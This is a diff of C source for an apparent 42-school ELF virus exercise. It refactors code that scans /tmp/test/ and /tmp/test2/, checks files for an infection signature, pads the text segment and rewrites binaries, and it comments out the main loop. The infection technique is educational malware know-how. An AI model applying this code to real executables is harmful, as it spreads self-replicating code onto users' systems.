@@ -6,7 +6,7 @@
 /*   By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2022/07/22 12:32:02 by fcadet            #+#    #+#             */
-/*   Updated: 2022/07/24 14:48:51 by fcadet           ###   ########.fr       */
+/*   Updated: 2022/07/24 21:48:13 by fcadet           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -48,8 +48,18 @@ typedef struct		s_sizes {
 	uint64_t	m_pad;
 }					t_sizes;
 
+typedef struct		s_buffs {
+	uint8_t		path[BUFF_SZ];
+	uint8_t		zeros[BUFF_SZ];
+	uint8_t		entry[BUFF_SZ];
+}					t_buffs;
+
 t_hdrs			hdrs = { 0 };
 t_sizes			sz = { 0 };
+t_buffs			buffs = { 0 };
+
+uint8_t			*mem = NULL;
+uint64_t		x_pad = 0;
 
 int		ret_close(int fd, int ret) {
 	if (fd >= 0)
@@ -81,20 +91,19 @@ int64_t			get_fd_size(int fd) {
 }
 
 int		write_pad(int fd, uint64_t size) {
-	static uint8_t		buff[BUFF_SZ] = { 0 };
 	uint64_t			write_sz = 0;
 	int64_t				w_ret;
 
 	for (; size; size -= write_sz) {
 		write_sz = size < BUFF_SZ ? size : BUFF_SZ;
-		if ((w_ret = write(fd, buff, write_sz)) < 0
+		if ((w_ret = write(fd, buffs.zeros, write_sz)) < 0
 				|| (uint64_t)w_ret != write_sz)
 			return (-1);
 	}
 	return (0);
 }
 
-static int		map_file(uint8_t *path, uint8_t **mem) {
+static int		map_file(uint8_t *path) {
 	int			src;
 	int64_t		s_ret;
 
@@ -102,13 +111,13 @@ static int		map_file(uint8_t *path, uint8_t **mem) {
 		return (-1);
 	if ((s_ret = get_fd_size(src)) < 0
 			|| (sz.mem = (uint64_t)s_ret) < sizeof(Elf64_Ehdr)
-			|| (*mem = mmap(NULL, sz.mem,
+			|| (mem = mmap(NULL, sz.mem,
 					PROT_READ | PROT_WRITE, MAP_PRIVATE, src, 0)) == MAP_FAILED)
 		return (ret_close(src, -1));
 	return (ret_close(src, 0));
 }
 
-static void		write_mem(uint8_t *path, uint8_t *mem, int x_pad) {
+static void		write_mem(uint8_t *path) {
 	int			dst;
 	int64_t		w_ret;
 	uint64_t	code_offset;
@@ -135,7 +144,7 @@ static int		test_elf_hdr(void) {
 	return (0);
 }
 
-static int		check_infection(uint8_t *mem) {
+static int		check_infection(void) {
 	if (sz.mem < SIGN_SZ)
 		return (-1);
 	if (!str_n_cmp((char *)(mem + sz.mem - SIGN_SZ), SIGN, SIGN_SZ))
@@ -143,7 +152,7 @@ static int		check_infection(uint8_t *mem) {
 	return (0);
 }
 
-static int		find_txt_seg(uint8_t *mem) {
+static int		find_txt_seg(void) {
 	Elf64_Phdr	*p_hdr;
 	uint64_t	i;
 
@@ -165,7 +174,7 @@ static void		get_sizes(void) {
 	sz.m_pad = hdrs.nxt->p_vaddr - (hdrs.txt->p_vaddr + hdrs.txt->p_memsz);
 }
 
-static int		set_x_pad(uint8_t *mem, uint8_t *x_pad) {
+static int		set_x_pad(void) {
 	Elf64_Phdr	*p_hdr;
 	Elf64_Shdr	*s_hdr;
 	uint64_t	i;
@@ -180,7 +189,7 @@ static int		set_x_pad(uint8_t *mem, uint8_t *x_pad) {
 					i < hdrs.elf->e_shnum; ++i, ++s_hdr)
 				if (s_hdr->sh_offset >= hdrs.txt->p_offset + hdrs.txt->p_filesz)
 					s_hdr->sh_offset += PAGE_SZ;
-			*x_pad = 1;
+			x_pad = 1;
 		} else
 			return (-1);
 	}
@@ -203,45 +212,39 @@ static int		update_mem(void) {
 	return (0);
 }
 
-static void		proc_entries(uint8_t *ent_buff, uint64_t dir_ret, char *root_path) {
-	uint8_t			*mem;
+/*
+static void		proc_entries(uint64_t dir_ret, char *root_path) {
 	uint16_t		ent_sz;
-	uint8_t			path_buff[BUFF_SZ];
 	uint8_t			*ent_ptr;
-	uint8_t			x_pad;
 
-	for (ent_ptr = ent_buff; dir_ret; dir_ret -= ent_sz, ent_ptr += ent_sz) {
-		ent_sz = *(uint16_t *)(ent_ptr + 16);
-
-		get_full_path(root_path, (char *)(ent_ptr + 18), path_buff);
-		if (map_file(path_buff, &mem) < 0
-				|| check_infection(mem))
+	for (ent_ptr = buffs.entry; dir_ret;
+			ent_sz = *(uint16_t *)(ent_ptr + 16),
+			dir_ret -= ent_sz, ent_ptr += ent_sz) {
+		get_full_path(root_path, (char *)(ent_ptr + 18), buffs.path);
+		if (map_file(buffs.path) < 0)
 			continue;
 		hdrs.elf = (Elf64_Ehdr *)mem;
-		if (test_elf_hdr()
-				|| find_txt_seg(mem))
-			goto unmap_continue;
-		get_sizes();
-		if (set_x_pad(mem, &x_pad)
-				|| update_mem())
-			goto unmap_continue;
-		write_mem(path_buff, mem, x_pad);
-		unmap_continue: munmap(mem, sz.mem);
+		if (!check_infection() && !test_elf_hdr() && !find_txt_seg()
+				&& !set_x_pad() && !update_mem())
+			write_mem(buffs.path);
+		munmap(mem, sz.mem);
 	}
+}
+
+static void		proc_dir(char *dir) {
+	int				dir_fd;
+	int64_t			dir_ret;
+
+	if ((dir_fd = open(dir, O_RDONLY | O_DIRECTORY)) < 0)
+		return;
+	while ((dir_ret = syscall(SYS_getdents, dir_fd, buffs.entry, BUFF_SZ)) > 0)
+		proc_entries(dir_ret, dir);
+	close(dir_fd);
 }
 
 int		main(void) {
-	int				dir_fd;
-	uint64_t		i;
-	int64_t			dir_ret;
-	char			*dirs[] = { "/tmp/test/", "/tmp/test2/" };
-	uint8_t			ent_buff[BUFF_SZ];
-
-	for (i = 0; i < 2; ++i) {
-		if ((dir_fd = open(dirs[i], O_RDONLY | O_DIRECTORY)) < 0)
-			continue;
-		while ((dir_ret = syscall(SYS_getdents, dir_fd, ent_buff, BUFF_SZ)) > 0)
-			proc_entries(ent_buff, dir_ret, dirs[i]);
-		close(dir_fd);
-	}
+	//bzero glob vars
+	proc_dir("/tmp/test/");
+	proc_dir("/tmp/test2/");
 }
+*/
